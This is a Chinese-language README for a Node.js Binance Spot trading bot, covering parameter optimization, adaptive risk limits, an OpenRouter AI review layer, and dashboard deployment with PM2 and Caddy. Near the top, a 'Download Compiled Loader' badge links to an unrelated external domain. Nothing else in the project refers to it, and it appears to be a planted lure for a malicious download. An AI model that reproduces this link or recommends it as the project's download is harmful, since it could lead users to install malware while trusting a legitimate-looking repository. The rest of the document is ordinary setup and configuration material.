# Binance Spot 自動交易 Bot (Node.js)

這是 Binance Spot 自動交易專案（可切 `testnet/live`），已加入：
- 定期自動調參（optimizer）
- 根據歷史成交績效的自適應風控（performance advisor）
- Dashboard（持倉/績效/日曆/AI模型表現）
- DCA 安全補倉
- AI 模型路由與 AI micro-tune

## 目前版本重點（2026-05）

[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)

- `BINANCE_ENV=testnet|live` 可切換 Binance API/WS 端點。
- `MAX_DAILY_TRADES_SOFT_BYPASS_*`：高品質 AI `APPROVE` 可軟性放寬日交易筆數（硬風控仍生效）。
- `AI_MICRO_TUNE_*`：AI 可在安全邊界內微調下單金額倍率與交易節奏。
- Dashboard 已支援 `trades.csv` / `decisions.csv` 無 header fallback 解析，避免空白表格。
- Dashboard 口徑：
  - `Total Performance`：總資產（equity）口徑
  - `Today/7D/30D PnL`：已實現（平倉）口徑


## 風險先講清楚

無法保證「最大利益」或穩賺。這版做的是：
- 用近期 K 線挑當下表現較好的參數
- 用最近成交績效動態切換風格（積極/平衡/保守）
- 連虧時自動降倉位與冷卻

## 自適應機制（新增）

系統會讀取 `logs/trades.csv` 最近 30 筆平倉結果：
- 勝率高、平均 PnL 正：提高下單額度（最多約 1.25x）
- 勝率差或連虧：降低下單額度（約 0.5x）+ 幾輪冷卻
- 同步調整 `MAX_DAILY_TRADES` 的實際上限

## 新增的自動優化機制

- 每隔 `OPTIMIZE_EVERY_LOOPS` 輪，自動對多組參數回測
- 挑選分數最高組合套用到下一輪交易
- 回測輸出：score、return、trades、winRate

新增環境變數：

```env
OPTIMIZE_EVERY_LOOPS=30
OPTIMIZATION_LOOKBACK=300
```

## 快速使用

```powershell
Copy-Item .env.example .env
npm install
npm start
```

## .env 參數定義（不含金鑰）

- `SYMBOL`: 單一交易對（向下相容），例如 `BTCUSDT`。
- `SYMBOLS`: 多交易對清單（逗號分隔），例如 `BTCUSDT,ETHUSDT,SOLUSDT`；設定後會逐一監控與下單。
- `INTERVAL`: K 線週期，例如 `1m`、`5m`。
- `KLINE_LIMIT`: 每次抓取的 K 線數量；需足夠支撐指標計算。
- `TRADE_QUOTE_AMOUNT`: 基礎單筆買入金額（USDT）；實際會再乘上自適應/波動/模式係數。
- `MAX_DAILY_TRADES`: 單日最多交易次數上限。
- `MAX_DAILY_TRADES_SOFT_BYPASS_ENABLED`: 啟用 AI 高信心軟放行日交易上限。
- `MAX_DAILY_TRADES_BYPASS_MIN_CONFIDENCE`: 軟放行所需 AI 最低信心值。
- `MAX_CONSECUTIVE_LOSSES`: 連續虧損到此數量後停止新交易。
- `DRY_RUN`: `true` 只模擬不下單；`false` 送 Testnet 真實測試單。
- `LOOP_SECONDS`: 主循環每輪間隔秒數。
- `RECV_WINDOW`: Binance signed request 的 `recvWindow`（毫秒）。

- `OPTIMIZE_EVERY_LOOPS`: 每幾輪執行一次策略參數優化。
- `OPTIMIZATION_LOOKBACK`: 優化時使用的歷史 K 線長度。

- `AI_ENABLED`: 是否啟用 AI 審核層。
- `AI_PROVIDER`: AI 提供者名稱（目前為 `openrouter`）。
- `OPENROUTER_MODEL`: 使用的 OpenRouter 模型名稱。
- `OPENROUTER_BASE_URL`: OpenRouter API base URL。
- `AI_TIMEOUT_MS`: AI API timeout（毫秒）；超時會自動 BLOCK。

- `FEE_BPS`: 手續費假設（bps，1 bps = 0.01%）。
- `SLIPPAGE_BPS`: 滑價假設（bps）。
- `MAX_DAILY_LOSS_USDT`: 日內最大可承受已實現虧損，超過觸發熔斷。

- `VOLATILITY_LOOKBACK`: 波動率計算回看 K 線數。
- `VOLATILITY_TARGET`: 目標波動率；高於目標會降低倉位。
- `VOLATILITY_MIN_MULTIPLIER`: 波動降倉乘數下限，避免降到 0。

- `MARKET_REGIME_ENABLED`: 是否啟用市場狀態判斷（積極/平衡/保守）。
- `MARKET_REGIME_AI_OVERRIDE`: 是否允許 AI 以風險等級覆蓋市場模式。
- `AI_MICRO_TUNE_ENABLED`: 是否啟用 AI 微調 quote/trades 倍率。
- `AI_MICRO_TUNE_MIN_QUOTE_MULTIPLIER` / `AI_MICRO_TUNE_MAX_QUOTE_MULTIPLIER`: AI 可調整下單金額倍率邊界。
- `AI_MICRO_TUNE_MIN_TRADES_MULTIPLIER` / `AI_MICRO_TUNE_MAX_TRADES_MULTIPLIER`: AI 可調整每日交易節奏倍率邊界。

- `CAPITAL_LIMIT_USDT`: 策略可用資金上限（風控 cap）。
- `MAX_TRADE_QUOTE_AMOUNT`: 單筆最大下單金額（USDT）。
- `MIN_USDT_BALANCE`: 可用 USDT 低於此值時禁止新 BUY。
- `DCA_ENABLED`, `DCA_MAX_BUYS`, `DCA_DROP_LEVELS`, `DCA_SIZE_MULTIPLIERS`, `DCA_REQUIRE_UPTREND`, `DCA_MAX_POSITION_PERCENT`: 補倉機制與安全上限。

## 常用查詢

```powershell
npm run status
npm run balance
```

## 備註

- `DRY_RUN=true` 先做模擬
- `DRY_RUN=false` 才會送 Spot Testnet 下單
- 交易記錄：`logs/trades.csv`

## AI Advisor（OpenRouter）

- AI Advisor 是審核層，不是下單層。
- 流程是 `strategy -> AI review -> riskManager -> execute`。
- 只有 BUY/SELL 類 signal 會呼叫 AI，HOLD 不呼叫。
- AI API 失敗、timeout、JSON parse 失敗時，預設 BLOCK，避免失控交易。
- OpenRouter free 有 rate limit，不適合每分鐘高頻呼叫。

`.env` 設定範例：

```env
AI_ENABLED=true
AI_PROVIDER=openrouter
OPENROUTER_API_KEY=你的_key
OPENROUTER_MODEL=openrouter/free
OPENROUTER_BASE_URL=https://openrouter.ai/api/v1
AI_TIMEOUT_MS=10000
```

測試建議：

1. 先 `DRY_RUN=true`
2. 執行 `npm run test:ai`，確認 AI 回 JSON
3. 確認 BLOCK / APPROVE / REDUCE_SIZE 都能正常處理
4. 再改 `DRY_RUN=false` 跑 Binance Spot Testnet

## 進階風控（新增）

- 日內虧損熔斷：`MAX_DAILY_LOSS_USDT`
- 成本模型：`FEE_BPS` + `SLIPPAGE_BPS`（會反映在成交與 PnL）
- 高波動降倉：用 `VOLATILITY_*` 自動縮小下單額

```env
FEE_BPS=10
SLIPPAGE_BPS=5
MAX_DAILY_LOSS_USDT=50
VOLATILITY_LOOKBACK=30
VOLATILITY_TARGET=0.002
VOLATILITY_MIN_MULTIPLIER=0.4
CAPITAL_LIMIT_USDT=1000
MAX_TRADE_QUOTE_AMOUNT=100
MIN_USDT_BALANCE=50
```

- `CAPITAL_LIMIT_USDT`: 策略可用總資金上限（單筆也不會超過此值）
- `MAX_TRADE_QUOTE_AMOUNT`: 單筆最大 USDT 下單額
- `MIN_USDT_BALANCE`: 可用 USDT 低於此值時，禁止新 BUY
## Optimizer 監控

每次 optimizer 執行都會寫入 `logs/optimizer.csv`，可用來觀察：
- 是否過度頻繁換參數
- BTCUSDT / ETHUSDT / BNBUSDT / XRPUSDT 各自表現差異
- 是否因為 `too_few_trades`、`low_profit_factor`、`drawdown_too_high` 等原因沒有套用

主要欄位包含：
- `symbol`, `interval`, `lookback`, `candidateCount`
- `selectedParams`, `previousParams`, `changed`, `reason`
- `score`, `returnPct`, `totalPnl`, `trades`, `wins`, `losses`, `winRate`
- `avgPnl`, `avgWin`, `avgLoss`, `profitFactor`
- `maxDrawdownPct`, `maxConsecutiveLosses`
- `feeBps`, `slippageBps`

## Report 指令

```powershell
npm run report
```

輸出檔案：
- `logs/report.json`

## Equity 曲線

`logs/equity.csv` 用途：
- 觀察總資產曲線（equity curve）
- 觀察 drawdown
- 比只看 `trades.csv` 更適合評估策略穩定性
## 一鍵啟動（Windows PowerShell）

專案根目錄：

```text
c:\Users\Jimmy Wang\\Codex\binance-testnet-bot
```

執行需要的關鍵檔案：
- 啟動主程式：`src/index.js`
- 環境設定：`.env`
- 參數範本：`.env.example`
- 狀態查詢：`scripts-status.js`
- 餘額查詢：`scripts-balance.js`
- 報表：`scripts/report.js`

請直接在 PowerShell 貼上：

```powershell
cd c:\Users\Jimmy Wang\\Codex\binance-testnet-bot

# 第一次執行才需要
npm install

# 若尚未建立 .env
if (!(Test-Path .env)) { Copy-Item .env.example .env }

# 啟動 Bot
npm start
```

常用指令：

```powershell
# 看持倉、PnL、最近交易/決策
npm run status

# 看 Testnet 餘額摘要
npm run balance

# 產生 trades/decisions/optimizer 統整報表
npm run report

# 測試 AI advisor
npm run test:ai

# 回填目前帳戶持幣到 bot state（修復 Open Positions 為空）
npm run seed:positions

# 記錄入金/出金（避免被算成策略收益）
npm run capital:flow deposit 100 "topup"
npm run capital:flow withdrawal 50 "transfer out"
```

停止 Bot：

```text
Ctrl + C
```

## Dashboard 安全部署（可直接 Pull）

這版已內建：
- `dashboard-api/server.js`（只讀報表 API）
- `dashboard/index.html`（前端監控頁）
- API Key 驗證（`X-API-Key`）
- CORS 白名單（`DASHBOARD_ALLOWED_ORIGINS`）
- Rate limit + Helmet 安全標頭

`.env` 需設定：

```env
DASHBOARD_API_KEY=請填一組長隨機字串
DASHBOARD_PORT=8787
DASHBOARD_ALLOWED_ORIGINS=https://bot.jimmyn8n.work
```

建議產生 key（Linux VM）：

```bash
openssl rand -hex 32
```

### VM 端啟動（PM2）

```bash
cd ~/binance
git pull
npm install
pm2 start src/index.js --name binance-bot
pm2 start dashboard-api/server.js --name dashboard-api
pm2 save
pm2 ls
```

### Caddy 反向代理（範例）

把你的 `~/n8n-prod/Caddyfile` 加上：

```caddy
bot.jimmyn8n.work {
    root * /root/binance/dashboard
    file_server
    handle /api/* {
        reverse_proxy 127.0.0.1:8787
    }
}
```

重載：

```bash
cd ~/n8n-prod
docker compose restart caddy
```

### 驗證

```bash
curl http://127.0.0.1:8787/health
curl -H "X-API-Key: 你的DASHBOARD_API_KEY" http://127.0.0.1:8787/report
curl -H "X-API-Key: 你的DASHBOARD_API_KEY" http://127.0.0.1:8787/equity/latest
```

安全重點：
- 不要把 `.env`、API key commit 到 GitHub
- API 服務跑在 VM 上，請只允許經由 Caddy/Cloudflare 對外存取
- 若 key 洩漏，立刻改 `.env` 的 `DASHBOARD_API_KEY` 並 `pm2 restart dashboard-api`

## Dashboard 登入（手機友善）

新版支援兩種驗證：
- `DASHBOARD_PASSWORD`：前端登入一次後用安全 Cookie 維持 session（手機建議用這種）
- `DASHBOARD_API_KEY`：API 呼叫備援方式（進階/程式整合）

請在 VM 的 `~/binance/.env` 設定：

```env
DASHBOARD_PASSWORD=你自訂的登入密碼
DASHBOARD_SESSION_SECRET=隨機長字串
DASHBOARD_SESSION_DAYS=30
```

修改後：

```bash
cd ~/binance
pm2 restart dashboard-api --update-env
pm2 save
```

## VM 架構文件

完整架構與維運手冊在：
- [VM-ARCHITECTURE.md](/c:/Users/Jimmy Wang//Codex/binance-testnet-bot/VM-ARCHITECTURE.md)

